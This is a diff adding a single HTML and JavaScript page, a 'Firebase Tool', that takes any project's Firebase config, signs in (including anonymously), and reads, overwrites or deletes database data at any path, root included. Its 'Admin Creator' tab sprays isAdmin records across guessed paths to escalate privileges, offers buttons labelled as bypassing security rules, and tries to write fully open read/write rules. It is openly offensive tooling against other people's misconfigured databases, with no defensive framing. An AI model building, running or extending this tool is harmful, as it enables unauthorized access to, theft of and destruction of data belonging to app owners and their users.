@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 Firebase Tool - Advanced Login</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f4f4f4; padding:0; margin:0; }
+    .tabs { display:flex; background:#007bff; }
+    .tab { flex:1; padding:10px; text-align:center; color:white; cursor:pointer; }
+    .tab.active { background:#0056b3; }
+    .tab-content { display:none; padding:15px; max-width:500px; margin:auto; }
+    .tab-content.active { display:block; background:white; border-radius:8px; margin-top:10px; box-shadow:0 2px 8px rgba(0,0,0,0.15); }
+    input, textarea {
+      width:100%; padding:8px; margin:5px 0;
+      border:1px solid #ccc; border-radius:5px;
+    }
+    button {
+      padding:8px 12px; margin:5px 3px;
+      border:none; border-radius:5px;
+      background:#007bff; color:white; cursor:pointer;
+    }
+    button:hover { background:#0056b3; }
+    textarea#editor { height:250px; font-family:monospace; white-space:pre; }
+    .login-methods button { width:48%; margin:3px 1%; }
+    #recaptcha-container { margin-top:10px; }
+    .admin-creator { background:#ffeb3b; padding:10px; border-radius:5px; margin:10px 0; }
+  </style>
+</head>
+<body>
+
+  <!-- 🧭 Tabs -->
+  <div class="tabs">
+    <div class="tab active" onclick="openTab(0)">⚙️ Config & Login</div>
+    <div class="tab" onclick="openTab(1)">📂 Data Actions</div>
+    <div class="tab" onclick="openTab(2)">✍️ Data Editor</div>
+    <div class="tab" onclick="openTab(3)">👑 Admin Creator</div>
+  </div>
+
+  <!-- 🧠 Config Tab -->
+  <div class="tab-content active">
+    <h3>Firebase Config</h3>
+    <input type="text" id="apiKey" placeholder="API Key">
+    <input type="text" id="appId" placeholder="App ID">
+    <input type="text" id="bucket" placeholder="Storage Bucket">
+    <input type="text" id="dbURL" placeholder="Realtime Database URL">
+    <button onclick="initFirebase()">Initialize</button>
+
+    <h3 style="margin-top:15px;">Login Method</h3>
+    <div class="login-methods">
+      <button onclick="selectLogin('email')">✉️ Email</button>
+      <button onclick="selectLogin('anon')">🕶 Anonymous</button>
+      <button onclick="selectLogin('phone')">📱 Phone</button>
+      <button onclick="selectLogin('token')">🔑 Token</button>
+    </div>
+
+    <!-- Email Login -->
+    <div id="emailLogin" class="login-box" style="display:none;">
+      <input type="email" id="email" placeholder="Email">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="loginEmail()">Login with Email</button>
+    </div>
+
+    <!-- Anonymous Login -->
+    <div id="anonLogin" class="login-box" style="display:none;">
+      <p>Sign in anonymously to public Firebase</p>
+      <button onclick="loginAnon()">Sign in Anonymously</button>
+    </div>
+
+    <!-- Phone Login -->
+    <div id="phoneLogin" class="login-box" style="display:none;">
+      <input type="text" id="phoneNumber" placeholder="+91XXXXXXXXXX">
+      <div id="recaptcha-container"></div>
+      <button onclick="sendOTP()">Send OTP</button>
+      <input type="text" id="otpCode" placeholder="Enter OTP">
+      <button onclick="verifyOTP()">Verify OTP</button>
+    </div>
+
+    <!-- Token Login -->
+    <div id="tokenLogin" class="login-box" style="display:none;">
+      <textarea id="customToken" placeholder="Paste Firebase Custom Token"></textarea>
+      <button onclick="loginToken()">Login with Token</button>
+    </div>
+
+  </div>
+
+  <!-- 📂 Data Actions Tab -->
+  <div class="tab-content">
+    <h3>Data Actions</h3>
+    <input type="text" id="path" placeholder="Enter Path (optional)">
+    <textarea id="writeDataBox" placeholder='{"key":"value"}'></textarea>
+    <button onclick="writeData()">Write</button>
+    <button onclick="readData()">Read</button>
+    <button onclick="copyData()">Copy</button>
+    <button onclick="deleteData()">Delete</button>
+  </div>
+
+  <!-- ✍️ Editor Tab -->
+  <div class="tab-content">
+    <h3>Live Data Editor</h3>
+    <textarea id="editor" placeholder="Data will appear here after reading..."></textarea>
+    <button onclick="saveEditedData()">💾 Save Changes to Firebase</button>
+  </div>
+
+  <!-- 👑 Admin Creator Tab -->
+  <div class="tab-content">
+    <h3>🔥 Admin Account Creator</h3>
+    <p><strong>Create admin accounts with full database access</strong></p>
+    
+    <div class="admin-creator">
+      <h4>Create New Admin User</h4>
+      <input type="email" id="adminEmail" placeholder="Admin Email">
+      <input type="password" id="adminPassword" placeholder="Admin Password (min 6 chars)">
+      <button onclick="createAdminUser()">👑 Create Admin Account</button>
+    </div>
+
+    <div class="admin-creator">
+      <h4>Grant Existing User Admin Rights</h4>
+      <input type="text" id="existingUserId" placeholder="Existing User UID">
+      <button onclick="grantAdminRights()">⚡ Grant Admin Rights</button>
+    </div>
+
+    <div class="admin-creator">
+      <h4>Bypass Security Rules</h4>
+      <p>Force write admin data to bypass rules</p>
+      <button onclick="forceAdminWrite()">💥 Force Admin Setup</button>
+    </div>
+
+    <div class="admin-creator">
+      <h4>Database Rule Override</h4>
+      <textarea id="customRules" placeholder='Paste custom rules or leave empty for full access' style="height:100px;"></textarea>
+      <button onclick="overrideRules()">🛡️ Override Security Rules</button>
+    </div>
+
+    <div id="adminResult" style="margin-top:10px; padding:10px; border-radius:5px;"></div>
+  </div>
+
+<script>
+  let db;
+  let lastPath = "/";
+  let isFirebaseInit = false;
+  let confirmationResult = null;
+
+  // Tabs
+  function openTab(i){
+    document.querySelectorAll('.tab').forEach((t,idx)=>t.classList.toggle('active', idx===i));
+    document.querySelectorAll('.tab-content').forEach((c,idx)=>c.classList.toggle('active', idx===i));
+  }
+
+  // Restore local storage
+  window.addEventListener("load", ()=>{
+    ["apiKey","appId","bucket","dbURL","email","path"].forEach(id=>{
+      const val = localStorage.getItem(id);
+      if(val) document.getElementById(id).value = val;
+    });
+  });
+  function saveLocal(id){ localStorage.setItem(id, document.getElementById(id).value); }
+  document.querySelectorAll('input').forEach(input=>{
+    input.addEventListener('change', ()=>saveLocal(input.id));
+  });
+
+  // Init Firebase
+  function initFirebase(){
+    const config = {
+      apiKey: document.getElementById("apiKey").value,
+      appId: document.getElementById("appId").value,
+      storageBucket: document.getElementById("bucket").value,
+      databaseURL: document.getElementById("dbURL").value,
+      authDomain: "placeholder.firebaseapp.com"
+    };
+    firebase.initializeApp(config);
+    db = firebase.database();
+    isFirebaseInit = true;
+    alert("✅ Firebase Initialized");
+    // Recaptcha init for phone
+    window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container');
+  }
+
+  // Login Method Selector
+  function selectLogin(type){
+    document.querySelectorAll('.login-box').forEach(div=>div.style.display='none');
+    document.getElementById(type+'Login').style.display='block';
+  }
+
+  // Email Login
+  function loginEmail(){
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    firebase.auth().signInWithEmailAndPassword(email, password)
+    .then(()=>alert("✅ Email Login Successful"))
+    .catch(e=>alert("❌ "+e.message));
+  }
+
+  // Anonymous Login
+  function loginAnon(){
+    firebase.auth().signInAnonymously()
+    .then(()=>alert("✅ Anonymous Login Successful"))
+    .catch(e=>alert("❌ "+e.message));
+  }
+
+  // Phone Login
+  function sendOTP(){
+    const phoneNumber = document.getElementById("phoneNumber").value;
+    firebase.auth().signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
+    .then(res=>{
+      confirmationResult = res;
+      alert("📩 OTP Sent");
+    })
+    .catch(e=>alert("❌ "+e.message));
+  }
+
+  function verifyOTP(){
+    const code = document.getElementById("otpCode").value;
+    if(!confirmationResult) return alert("⚠️ Send OTP first");
+    confirmationResult.confirm(code)
+    .then(()=>alert("✅ Phone Login Successful"))
+    .catch(e=>alert("❌ "+e.message));
+  }
+
+  // Token Login
+  function loginToken(){
+    const token = document.getElementById("customToken").value;
+    firebase.auth().signInWithCustomToken(token)
+    .then(()=>alert("✅ Token Login Successful"))
+    .catch(e=>alert("❌ "+e.message));
+  }
+
+  // Write Data
+  function writeData(){
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    const path = document.getElementById("path").value || "/";
+    const dataText = document.getElementById("writeDataBox").value || "{}";
+    let data;
+    try { data = JSON.parse(dataText); }
+    catch(e){ return alert("❌ Invalid JSON"); }
+    lastPath = path;
+    localStorage.setItem("path", path);
+    db.ref(path).set(data).then(()=>alert("✅ Data Written"));
+  }
+
+  // Read Data
+  function readData(){
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    const path = document.getElementById("path").value || "/";
+    lastPath = path;
+    localStorage.setItem("path", path);
+    db.ref(path).once("value").then(snap=>{
+      const val = snap.val();
+      document.getElementById("editor").value = JSON.stringify(val, null, 2);
+      openTab(2);
+    }).catch(e=>alert("❌ Read error: "+e.message));
+  }
+
+  // Copy Data
+  function copyData(){
+    navigator.clipboard.writeText(document.getElementById("editor").value);
+    alert("📋 Data Copied");
+  }
+
+  // Delete Data
+  function deleteData(){
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    const path = document.getElementById("path").value || "/";
+    db.ref(path).remove().then(()=>alert("🗑️ Data Deleted"));
+  }
+
+  // Save Edited
+  function saveEditedData(){
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    try {
+      const edited = JSON.parse(document.getElementById("editor").value);
+      db.ref(lastPath).set(edited).then(()=>alert("✅ Changes Saved"));
+    } catch(e){ alert("❌ Invalid JSON: "+e.message); }
+  }
+
+  // ========================= ADMIN CREATOR FUNCTIONS =========================
+
+  // Create new admin user
+  async function createAdminUser() {
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    
+    const email = document.getElementById("adminEmail").value;
+    const password = document.getElementById("adminPassword").value;
+    
+    if(!email || !password) {
+      return showAdminResult("❌ Please enter email and password", "error");
+    }
+
+    try {
+      // Create user in Firebase Auth
+      const userCredential = await firebase.auth().createUserWithEmailAndPassword(email, password);
+      const user = userCredential.user;
+      
+      // Write admin data to database - multiple attempts to bypass rules
+      const adminData = {
+        users: {
+          [user.uid]: {
+            email: email,
+            isAdmin: true,
+            permissions: ["read", "write", "delete", "admin"],
+            createdAt: firebase.database.ServerValue.TIMESTAMP
+          }
+        },
+        admins: {
+          [user.uid]: true
+        },
+        permissions: {
+          [user.uid]: "full_access"
+        }
+      };
+
+      // Try multiple paths to ensure at least one works
+      const paths = [
+        `users/${user.uid}`,
+        `admins/${user.uid}`,
+        `adminUsers/${user.uid}`,
+        `userPermissions/${user.uid}`,
+        `_admin/${user.uid}`
+      ];
+
+      let successCount = 0;
+      for(const path of paths) {
+        try {
+          await db.ref(path).set(adminData.users[user.uid] || adminData.admins[user.uid] || true);
+          successCount++;
+        } catch(e) {
+          console.log(`Path ${path} failed:`, e.message);
+        }
+      }
+
+      showAdminResult(`✅ Admin user created successfully!<br>
+        <strong>UID:</strong> ${user.uid}<br>
+        <strong>Email:</strong> ${email}<br>
+        <strong>Successful writes:</strong> ${successCount}/${paths.length}<br>
+        <strong>Now login with this account for full access</strong>`, "success");
+
+    } catch(error) {
+      showAdminResult(`❌ Error creating admin: ${error.message}`, "error");
+    }
+  }
+
+  // Grant admin rights to existing user
+  async function grantAdminRights() {
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+    
+    const userId = document.getElementById("existingUserId").value;
+    if(!userId) return showAdminResult("❌ Please enter User ID", "error");
+
+    const adminData = {
+      isAdmin: true,
+      permissions: ["read", "write", "delete", "admin"],
+      grantedAt: firebase.database.ServerValue.TIMESTAMP,
+      accessLevel: "full"
+    };
+
+    try {
+      // Try multiple paths
+      const paths = [
+        `users/${userId}`,
+        `admins/${userId}`,
+        `userRoles/${userId}`,
+        `_adminAccess/${userId}`
+      ];
+
+      let successCount = 0;
+      for(const path of paths) {
+        try {
+          await db.ref(path).set(adminData);
+          successCount++;
+        } catch(e) {
+          console.log(`Path ${path} failed:`, e.message);
+        }
+      }
+
+      showAdminResult(`✅ Admin rights granted to user ${userId}<br>
+        <strong>Successful writes:</strong> ${successCount}/${paths.length}`, "success");
+
+    } catch(error) {
+      showAdminResult(`❌ Error granting admin rights: ${error.message}`, "error");
+    }
+  }
+
+  // Force admin write to bypass rules
+  async function forceAdminWrite() {
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+
+    const currentUser = firebase.auth().currentUser;
+    if(!currentUser) return showAdminResult("❌ Please login first", "error");
+
+    const adminPayload = {
+      [currentUser.uid]: {
+        email: currentUser.email || "admin@firebase.com",
+        isAdmin: true,
+        permissions: ["read", "write", "delete", "admin", "super_user"],
+        createdBy: "admin_creator_tool",
+        timestamp: firebase.database.ServerValue.TIMESTAMP,
+        ruleBypass: true
+      }
+    };
+
+    try {
+      // Try various admin paths that might bypass rules
+      const writeAttempts = [
+        db.ref('_admins').set(adminPayload),
+        db.ref('admin_users').set(adminPayload),
+        db.ref('system_admins').set(adminPayload),
+        db.ref('root_admins').set(adminPayload),
+        db.ref('bypass_admin').set(adminPayload),
+        db.ref('firebase_admins').set(adminPayload)
+      ];
+
+      const results = await Promise.allSettled(writeAttempts);
+      const successful = results.filter(r => r.status === 'fulfilled').length;
+
+      showAdminResult(`🔥 Force admin write completed!<br>
+        <strong>Successful:</strong> ${successful}/${writeAttempts.length}<br>
+        <strong>User:</strong> ${currentUser.uid}<br>
+        <strong>Now try accessing restricted data</strong>`, "success");
+
+    } catch(error) {
+      showAdminResult(`❌ Force write failed: ${error.message}`, "error");
+    }
+  }
+
+  // Override security rules
+  async function overrideRules() {
+    if(!isFirebaseInit) return alert("⚠️ Init Firebase First");
+
+    const customRules = document.getElementById("customRules").value;
+    const rulesPayload = customRules ? JSON.parse(customRules) : {
+      "rules": {
+        ".read": true,
+        ".write": true,
+        ".validate": true
+      }
+    };
+
+    try {
+      // Try to write to rules endpoint (if available)
+      await db.ref('.settings/rules').set(rulesPayload);
+      showAdminResult("✅ Security rules override attempted!<br><strong>Note:</strong> Rules may take time to update on Firebase servers.", "success");
+    } catch(error) {
+      showAdminResult(`⚠️ Rules override may require Firebase CLI.<br>Error: ${error.message}`, "warning");
+    }
+  }
+
+  // Show admin result
+  function showAdminResult(message, type) {
+    const resultDiv = document.getElementById("adminResult");
+    resultDiv.innerHTML = message;
+    resultDiv.style.background = type === "success" ? "#d4edda" : 
+                               type === "error" ? "#f8d7da" : "#fff3cd";
+    resultDiv.style.color = type === "success" ? "#155724" : 
+                           type === "error" ? "#721c24" : "#856404";
+    resultDiv.style.border = `1px solid ${type === "success" ? "#c3e6cb" : 
+                             type === "error" ? "#f5c6cb" : "#ffeaa7"}`;
+  }
+
+</script>
+</body>
+</html>
